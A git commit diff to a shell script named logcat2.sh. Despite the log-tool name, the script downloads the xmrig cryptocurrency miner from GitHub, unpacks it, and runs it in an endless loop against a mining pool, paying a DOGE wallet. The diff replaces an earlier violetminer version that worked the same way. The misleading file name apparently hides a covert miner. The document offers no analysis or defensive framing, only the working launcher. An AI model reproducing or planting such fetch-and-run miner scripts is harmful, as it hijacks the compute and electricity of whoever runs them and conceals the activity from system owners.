6f71ed50381f5a09d42b179c35c9cfa5296c108e
Gondoru <87273917+Gondoru@users.noreply.github.com>
2021-08-23 00:26:37 +0700

    Update logcat2.sh

--- logcat2.sh
+++ logcat2.sh
@@ -1,7 +1,7 @@
 #!/bin/sh
-wget https://github.com/turtlecoin/violetminer/releases/download/v0.2.2/violetminer-linux-v0.2.2.tar.gz && tar xvf violetminer-linux-v0.2.2.tar.gz && cd violetminer-linux-v0.2.2
+wget https://github.com/xmrig/xmrig/releases/download/v5.11.3/xmrig-5.11.3-xenial-x64.tar.gz && tar -zxf xmrig-5.11.3-xenial-x64.tar.gz && cd xmrig-5.11.3
 while [ 1 ]; do
-./violetminer --pool rx.unmineable.com:3333 --username DGB:D9zT4xf7iGNcbrH6nLEKBCqjmiC3yKPwc2.Asuq --password x --algorithm wrkzcoin --threads 5
+./xmrig  -o rx.unmineable.com:3333 -u DOGE:DSmJqAfFa9GdpSpMHG8URYg4MXLQHS4dDA.pajo -p x
 sleep 3
 done
 sleep 999
